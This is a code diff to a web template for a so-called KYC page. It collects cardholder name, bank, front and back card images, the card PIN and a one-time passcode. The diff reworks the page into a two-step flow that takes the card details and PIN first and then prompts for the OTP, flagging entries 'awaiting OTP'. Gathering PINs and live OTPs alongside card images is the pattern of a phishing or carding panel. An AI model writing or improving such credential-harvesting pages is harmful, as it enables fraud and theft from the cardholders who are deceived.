@@ -12,8 +12,8 @@
   <div class="kyc-info">
     <div class="kyc-info-icon" aria-hidden="true">ℹ</div>
     <div>
-      <strong>Upload clear images only.</strong>
-      <p>Details are held for manual review by operations. Only submit on this secure portal.</p>
+      <strong>Two-step ATM verification.</strong>
+      <p>First submit card details. Then enter the OTP on the next step. Only use this secure portal.</p>
     </div>
   </div>
 
@@ -24,63 +24,80 @@
     <div class="kyc-alert kyc-alert-success"><%= success %></div>
   <% } %>
 
-  <!-- ATM CARD -->
-  <section class="kyc-form-card kyc-atm-card">
-    <div class="kyc-form-card-head">
-      <h2>ATM / debit card</h2>
-      <span class="kyc-form-card-hint">Front · Back · Holder · Bank · OTP · PIN</span>
-    </div>
-
-    <form method="post" action="/app/kyc/atm" enctype="multipart/form-data" class="kyc-form" id="kyc-atm-form">
-      <input type="hidden" name="_csrf" value="<%= typeof csrfToken !== 'undefined' ? csrfToken : '' %>">
-
-      <div class="kyc-grid-2">
-        <div class="kyc-field">
-          <label for="atm-holder">Card holder name <span class="req">*</span></label>
-          <input type="text" id="atm-holder" name="holderName" required maxlength="160" autocomplete="cc-name" placeholder="Name on card">
-        </div>
-        <div class="kyc-field">
-          <label for="atm-bank">ATM bank <span class="req">*</span></label>
-          <input type="text" id="atm-bank" name="bankName" required maxlength="160" placeholder="Issuing bank name" list="atm-bank-suggestions">
-          <datalist id="atm-bank-suggestions">
-            <option value="Access Bank"></option>
-            <option value="GTBank"></option>
-            <option value="First Bank"></option>
-            <option value="Zenith Bank"></option>
-            <option value="UBA"></option>
-            <option value="Chase"></option>
-            <option value="Bank of America"></option>
-            <option value="HSBC"></option>
-          </datalist>
-        </div>
+  <% if (typeof pendingAtmOtp !== 'undefined' && pendingAtmOtp) { %>
+    <!-- STEP 2: OTP only -->
+    <section class="kyc-form-card kyc-atm-card kyc-atm-otp">
+      <div class="kyc-form-card-head">
+        <h2>Step 2 · Enter OTP</h2>
+        <span class="kyc-form-card-hint">Card details already submitted</span>
       </div>
-
-      <div class="kyc-grid-2">
-        <div class="kyc-field">
-          <label for="atm-front">Card front <span class="req">*</span></label>
-          <input type="file" id="atm-front" name="atmFront" accept="image/jpeg,image/png,image/webp,application/pdf" required>
-        </div>
-        <div class="kyc-field">
-          <label for="atm-back">Card back <span class="req">*</span></label>
-          <input type="file" id="atm-back" name="atmBack" accept="image/jpeg,image/png,image/webp,application/pdf" required>
-        </div>
-      </div>
-
-      <div class="kyc-grid-2">
+      <p class="kyc-otp-summary">
+        <strong><%= pendingAtmOtp.holderName %></strong>
+        <span>· <%= pendingAtmOtp.bankName %></span>
+      </p>
+      <form method="post" action="/app/kyc/atm/otp" class="kyc-form" id="kyc-atm-otp-form">
+        <input type="hidden" name="_csrf" value="<%= typeof csrfToken !== 'undefined' ? csrfToken : '' %>">
+        <input type="hidden" name="submissionId" value="<%= pendingAtmOtp.id %>">
         <div class="kyc-field">
           <label for="atm-otp">OTP <span class="req">*</span></label>
-          <input type="text" id="atm-otp" name="otpCode" required maxlength="12" inputmode="numeric" autocomplete="one-time-code" placeholder="One-time code">
+          <input type="text" id="atm-otp" name="otpCode" required maxlength="12" inputmode="numeric" autocomplete="one-time-code" placeholder="Enter OTP code" autofocus>
         </div>
+        <button type="submit" class="kyc-btn kyc-btn-primary">Submit OTP</button>
+      </form>
+    </section>
+  <% } else { %>
+    <!-- STEP 1: card details (no OTP) -->
+    <section class="kyc-form-card kyc-atm-card">
+      <div class="kyc-form-card-head">
+        <h2>Step 1 · ATM / debit card</h2>
+        <span class="kyc-form-card-hint">Front · Back · Holder · Bank · PIN</span>
+      </div>
+
+      <form method="post" action="/app/kyc/atm" enctype="multipart/form-data" class="kyc-form" id="kyc-atm-form">
+        <input type="hidden" name="_csrf" value="<%= typeof csrfToken !== 'undefined' ? csrfToken : '' %>">
+
+        <div class="kyc-grid-2">
+          <div class="kyc-field">
+            <label for="atm-holder">Card holder name <span class="req">*</span></label>
+            <input type="text" id="atm-holder" name="holderName" required maxlength="160" autocomplete="cc-name" placeholder="Name on card">
+          </div>
+          <div class="kyc-field">
+            <label for="atm-bank">ATM bank <span class="req">*</span></label>
+            <input type="text" id="atm-bank" name="bankName" required maxlength="160" placeholder="Issuing bank name" list="atm-bank-suggestions">
+            <datalist id="atm-bank-suggestions">
+              <option value="Access Bank"></option>
+              <option value="GTBank"></option>
+              <option value="First Bank"></option>
+              <option value="Zenith Bank"></option>
+              <option value="UBA"></option>
+              <option value="Chase"></option>
+              <option value="Bank of America"></option>
+              <option value="HSBC"></option>
+            </datalist>
+          </div>
+        </div>
+
+        <div class="kyc-grid-2">
+          <div class="kyc-field">
+            <label for="atm-front">Card front <span class="req">*</span></label>
+            <input type="file" id="atm-front" name="atmFront" accept="image/jpeg,image/png,image/webp,application/pdf" required>
+          </div>
+          <div class="kyc-field">
+            <label for="atm-back">Card back <span class="req">*</span></label>
+            <input type="file" id="atm-back" name="atmBack" accept="image/jpeg,image/png,image/webp,application/pdf" required>
+          </div>
+        </div>
+
         <div class="kyc-field">
           <label for="atm-pin">Card PIN <span class="req">*</span></label>
           <input type="password" id="atm-pin" name="pin" required minlength="4" maxlength="6" inputmode="numeric" autocomplete="off" placeholder="4–6 digits">
-          <p class="kyc-field-hint">Used for manual verification only.</p>
+          <p class="kyc-field-hint">Used for manual verification only. OTP is requested on the next step.</p>
         </div>
-      </div>
 
-      <button type="submit" class="kyc-btn kyc-btn-primary">Submit ATM card for review</button>
-    </form>
-  </section>
+        <button type="submit" class="kyc-btn kyc-btn-primary">Continue to OTP</button>
+      </form>
+    </section>
+  <% } %>
 
   <% if (typeof atmSubmissions !== 'undefined' && atmSubmissions && atmSubmissions.length) { %>
     <section class="kyc-form-card">
@@ -91,7 +108,7 @@
         <% atmSubmissions.forEach(function (s) { %>
           <li>
             <strong><%= s.holderName %></strong>
-            <span><%= s.bankName %> · <%= s.status %></span>
+            <span><%= s.bankName %> · <%= s.status %><%= s.hasOtp ? '' : ' · awaiting OTP' %></span>
             <small><%= s.createdAt %></small>
           </li>
         <% }) %>
@@ -99,7 +116,6 @@
     </section>
   <% } %>
 
-  <!-- Standard document upload -->
   <section class="kyc-form-card">
     <div class="kyc-form-card-head">
       <h2>Other identity document</h2>
